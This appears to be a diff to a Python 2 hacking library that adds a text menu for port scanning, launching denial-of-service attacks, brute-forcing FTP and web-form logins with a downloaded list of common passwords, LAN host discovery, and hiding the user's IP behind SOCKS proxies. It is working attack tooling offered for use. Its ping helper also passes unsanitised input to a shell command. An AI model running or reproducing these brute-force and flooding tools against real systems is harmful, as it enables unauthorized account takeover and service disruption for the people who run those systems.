@@ -18,7 +18,7 @@ HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTIO
 CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE
 OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.'''
 
-import socket, httplib, threading, time, urllib2
+import socket, httplib, threading, time, urllib2, os
 from Queue import Queue
 
 class FTPAuth(object):
@@ -34,7 +34,7 @@ class FTPAuth(object):
         self.username = ''
         self.password = ''
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.s.settimeout(8)
+        self.s.settimeout(3)
         self.s.connect((self.IP, self.port))
         self.s.recv(1024)
 
@@ -47,6 +47,8 @@ class FTPAuth(object):
         response = self.send('PASS ' + password + '\r\n')
         if '230' in response:
             return
+        elif '331' in response:
+            return 'Password required'
         else:
             raise Exception(response)
         
@@ -76,7 +78,7 @@ class AuthClient(object):
         try:
             import mechanize
         except:
-            raise Exception('Please install the mechanize module before continuing.')
+            raise MissingPackageException('Please install the mechanize module before continuing.')
         # Sets up common input names/ids and creates instance of mechanize.Browser()
         userfields = ['user', 'username', 'usr', 'email', 'name', 'login', 'userid', 'userid-input', 'player']
         passfields = ['pass', 'password', 'passwd', 'pw', 'pwd']
@@ -236,6 +238,8 @@ Accept-Language: en-US, en; q=0.5
 Accept-Encoding: gzip, deflate''' + '\r\n\r\n'
                     s.send(headers)
                     response = s.recv(1024)
+                    response = response.splitlines()
+                    response = '\n'.join(response[:7])
                     self.openlist.append(port)
                     if self.verbose:
                         with self.print_lock:
@@ -274,6 +278,99 @@ Accept-Encoding: gzip, deflate''' + '\r\n\r\n'
             self.q.put(worker)
 
         self.q.join()
+
+class LanScanner(object):
+    '''Scans local devices on your LAN network.
+    Commands:
+                    scan() Args: host_range(default (1, 255))
+    '''
+
+    def __init__(self):
+        self.host_range = []
+        self.alive_hosts = []
+        self.localIP = ''
+
+    def _threader(self):
+        while True:
+            self.worker = self.q.get()
+            self._scan(self.worker)
+            self.q.task_done()
+
+    def _scan(self, host):
+        import subprocess
+        try:
+            resp = subprocess.check_output(['ping', '-c1', '-W90', host])
+            self.alive_hosts.append(host)
+        except: return
+
+    def getLocalIP(self):
+        import subprocess
+        proc = subprocess.Popen(["ifconfig"], stdout=subprocess.PIPE, shell=True)
+        (out, err) = proc.communicate()
+        data = out.splitlines()
+        for line in data:
+            if 'inet ' in line and '127.' not in line:
+                return line.split(' ')[1]
+        
+    def scan(self, h_range = (1, 255)):
+        # Finds local IP first in order to determine IP range of local network
+        localip = self.getLocalIP()
+        stub = '.'.join(localip.split('.')[:-1])
+        # Adds list of possible local hosts to self.range_range
+        for i in range(h_range[0], h_range[1]):
+            self.host_range.append(stub + '.' + str(i))
+        self.q = Queue()
+        # Launches 100 threads to ping 254 potential hosts
+        for x in range(100):
+            t = threading.Thread(target=self._threader)
+            t.daemon = True
+            t.start()
+        for worker in self.host_range:
+            self.q.put(worker)
+        self.q.join()
+        return list(set(self.alive_hosts))
+    
+class _Getch:
+    """Gets a single character from standard input.  Does not echo to the
+    screen."""
+    def __init__(self):
+        try:
+            self.impl = _GetchWindows()
+        except ImportError:
+            try:
+                self.impl = _GetchUnix()
+            except ImportError:
+                self.impl = _GetchMacCarbon()
+
+    def __call__(self): return self.impl()
+
+
+class _GetchUnix:
+    def __init__(self):
+        import tty, sys, termios
+
+    def __call__(self):
+        import sys, tty, termios
+        try:
+            fd = sys.stdin.fileno()
+            old_settings = termios.tcgetattr(fd)
+            try:
+                tty.setraw(sys.stdin.fileno())
+                ch = sys.stdin.read(1)
+            finally:
+                termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
+            return ch
+        except: return raw_input('> ')
+
+class _GetchWindows:
+    def __init__(self):
+        import msvcrt
+
+    def __call__(self):
+        try:
+            import msvcrt
+            return msvcrt.getch()
+        except: return raw_input('> ')
 
 class Proxy(object):
     '''Can work in conjunction with getProxies() to tunnel all
@@ -337,7 +434,6 @@ def importFromString(code, name):
     exec code in module.__dict__
     return module
 
-
 def getIP(host):
     return socket.gethostbyname(host)
 
@@ -349,9 +445,9 @@ def getProxies(country_filter = 'ALL', proxy_type = ('Socks4', 'Socks5')):
     proxy_type: Specify whic Socks version to use, e.g. 'Socks5'
     '''
     try: import mechanize
-    except: raise Exception('Please install the mechanize module before continuing.')
+    except: raise MissingPackageException('Please install the mechanize module before continuing.')
     try: from bs4 import BeautifulSoup
-    except: raise Exception('Please install the beautifulsoup4 module before continuing.')
+    except: raise MissingPackageException('Please install the beautifulsoup4 module before continuing.')
     br = mechanize.Browser()
     br.set_handle_robots(False)
     br.addheaders = [('User-agent', 'googlebot')]
@@ -398,34 +494,195 @@ def send(IP, port, message, keepalive = False):
         sock.close()
     return response
 
+def ping(host):
+    """Pings a host and returns true if the host exists.
+    """
+    import os, platform
+    ping_str = "-n 1" if  platform.system().lower()=="windows" else "-c 1"
+    return os.system("ping " + ping_str + " " + host) == 0
+
 def topPasswords(amount):
-    '''Get up to 1,000,000 most common passwords.
+    '''Get up to 100,000 most common passwords.
     '''
     url = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10_million_password_list_top_100000.txt'
     passlist = urllib2.urlopen(url).read().split('\n')
     return passlist[:amount]
 
+def uiPortScan(address):
+    print ''
+    print '1) default scan (port range 1-1024)'
+    print '2) custom range'
+    ink = _Getch()
+    cmd = ink()
+    ps = PortScanner()
+    print 'Beginning port scan.'
+    if cmd == '1':
+        ps.scan(address)
+    if cmd == '2':
+        s_port = raw_input('Input starting port > ')
+        e_port = raw_input('Input end port >')
+        ps.scan(address, (s_port, e_port))
+    print 'Port scan complete.'
+
+def uiDOS(address):
+    dos = DOSer()
+    print ''
+    duration = raw_input('Duration > ')
+    threads = raw_input('Threads > ')
+    port = int(raw_input('Port > '))
+    payload = raw_input('Payload > ')
+    print 'Launching DOS attack'
+    dos.launch(address, duration, threads, port, payload)
+
+def uiTCPMessage(address):
+    print ''
+    port = int(raw_input('Input port >'))
+    message = raw_input('Message > ')
+    send(address, port, message)
+
+def uiLogin(address):
+    print ''
+    print 'Select login type'
+    print '1) HTTP/Form login'
+    print '2) FTP login'
+    print '3) Exit'
+    print ''
+    ink = _Getch()
+    cmd = ink()
+    if cmd == '1':
+        ac = AuthClient()
+        print '1) Dictionary attack'
+        print '2) Exit'
+        ink = _Getch()
+        cmd = ink()
+        if cmd == '1':
+            username = raw_input('Username > ')
+            print '1) Try most common passwords'
+            print '2) Import password list (separated by newline)'
+            cmd = ink()
+            if cmd == '1':
+                print 'Try the top <input number> out of 100,000 most common passwords:'
+                num = int(raw_input('> '))
+                passwords = topPasswords(num)
+            if cmd == '2':
+                passfile = raw_input('Filepath > ')
+                with open(passfile, 'r') as f:
+                    passwords = passfile.read().splitlines()
+            print 'Input a unique string the webpage may respond with if login fails'
+            print 'i.e. "please try again" or "login failed"'
+            failstring = raw_input('> ')
+            for password in passwords:
+                try:
+                    data = ac.login(address, username, password)
+                    if failstring in data:
+                        print password + ' failed'
+                    elif failstring not in data:
+                        print 'Login success!'
+                        print 'Password is: ' + password
+                        time.sleep(2)
+                        return
+                except:
+                    print password + ' failed'
+        if cmd == '2':
+            return
+
+    if cmd == '2':
+        ftp = FTPAuth(address)
+        print '1) Dictionary attack'
+        print '2) Single login'
+        print '3) Exit'
+        ink = _Getch()
+        cmd = ink()
+        username = raw_input('Username > ')
+        if cmd == '1':
+            print 'Try the top <input number> out of 100,000 most common passwords:'
+            num = raw_input('> ')
+            for password in topPasswords(num):
+                try:
+                    response = ftp.send('USER ' + username + '\r\n')
+                    if '331' in response:
+                        response = ftp.send('PASS ' + password + '\r\n')
+                        if '331' in response:
+                            response = ftp.send('PASS ' + password + '\r\n')
+                    if '230' in response:
+                        print 'Login success!'
+                        print 'Password is: ' + password
+                        time.sleep(2)
+                        return
+                    if '530' in response:
+                        print password + ' failed.'
+                        ftp = FTPAuth(address)
+                except:
+                    print password + ' failed.'
+                    ftp = FTPAuth(address)
+                    
+        if cmd == '2':
+            username = raw_input('Username > ')
+            ftp.send('USER ' + username + '\r\n')
+            password = raw_input('Password > ')
+            ftp.send('PASS ' + password + '\r\n')
+        if cmd == '3':
+            return
+
+def uiLanScan():
+    lan = LanScanner()
+    print 'Starting Lan scan'
+    hosts = lan.scan()
+    for ip in hosts:
+        print ip
+    print 'Lan scan complete.'
+    time.sleep(2)
+    
 def userInterface():
-    '''Start text-based interface for easier usage if hacklib isn't being used as a library.
+    '''Start UI if hacklib isn't being used as a library.
     '''
+    firstrun = 0
     while True:
-        print 'Enter an IP address or URL for further options.'
-        print 'Or, enter "proxy" to connect to a proxy.'
-        cmd = raw_input('> ')
-        if '.' in cmd: # Checks for . to make sure it's an IP or URL
-            address = getIP(cmd)
+        if firstrun == 0:
+            print '----------------------------------------------'
+            print 'Hey. What can I do you for?'
+            print '\n'
+            firstrun += 1
+        print 'Enter the number corresponding to your choice.'
+        print ''
+        print '1) Connect to a proxy'
+        print '2) Target an IP or URL'
+        print '3) Lan Scan'
+        print '4) Exit'
+        ink = _Getch()
+        cmd = ink()
+        if cmd == '4':
+            return
+        if cmd == '2':
+            address = raw_input('Input IP or URL > ')
+            if '.' not in address:
+                print 'Invalid IP/URL.'
+                return
             print 'What would you like to do?'
-            print '1) PortScan'
+            print ''
+            print '1) Port scan'
             print '2) DOS'
             print '3) Send TCP message'
             print '4) Attempt login'
-            cmd = getIP(raw_input('> '))
-        elif 'proxy' in cmd:
+            print '5) Exit'
+            cmd = ink()
+            if cmd == '1': uiPortScan(getIP(address))
+            if cmd == '2': uiDOS(getIP(address))
+            if cmd == '3': uiTCPMessage(getIP(address))
+            if cmd == '4': uiLogin(address)
+            cmd = ''
+
+        if cmd == '3':
+            uiLanScan()
+            
+        if cmd == '1':
             print 'Would you like to automatically find a proxy or input one manually?'
             print 'Enter the number corresponding to your choice.'
+            print ''
             print '1) Auto'
             print '2) Manual'
-            cmd = raw_input('> ')
+            cmd = ink()
+            print 'Connecting to a SOCKS proxy.'
             proxies = getProxies()
             global proxy
             proxy = Proxy()
@@ -433,14 +690,20 @@ def userInterface():
                 proxy.connect(getProxies())
                 print 'Your new IP address is ' + proxy.IP
                 print 'This proxy is located in ' + proxy.country
-            elif cmd == '2':
+                print '---------'
+                time.sleep(2)
+            if cmd == '2':
                 pr_address = raw_input('Proxy address > ')
                 pr_port = raw_input('Proxy port > ')
                 pr_type = raw_input('Enter "Socks4" or "Socks5" > ')
                 try: proxy.connect_manual(pr_address, pr_port, pr_type)
-                except: print 'Connection failed.'; pass
+                except: print 'Connection failed.'; time.sleep(2); pass
                 print 'Proxy connected.'
+                time.sleep(2)
                 pass
 
 if __name__ == '__main__':
     userInterface()
+
+class MissingPackageException(Exception):
+    '''Raise when 3rd party modules are not able to be imported.'''
